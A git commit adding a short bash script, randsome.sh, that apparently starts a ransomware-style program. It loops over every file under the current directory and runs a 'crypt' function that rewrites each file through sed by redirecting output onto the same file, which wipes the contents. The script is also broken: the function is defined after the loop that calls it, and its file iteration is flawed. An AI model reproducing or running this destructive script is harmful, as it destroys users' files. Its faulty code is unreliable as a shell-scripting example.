815585fd5053ef323045e886f107f7764f47de77
Robin Solde <robin.solde@gmail.com>
2017-07-26 13:31:29 +0200

    first try

--- randsome.sh
+++ randsome.sh
@@ -1,3 +1,25 @@
 #! /bin/bash
 
-echo toto
+titi()
+{
+   # echo "\$1"
+    echo "$1"
+}
+
+for i in $(ls -R ./) 
+    do
+       # echo "i"
+        if [ "$i" != "randsome.sh" ];
+        then
+            crypt $i
+           # echo toto;
+        fi
+      #  ls $i
+done
+
+crypt()
+{
+ cat $i | sed 's/a/pocebleu/g' > $i
+}
+
+
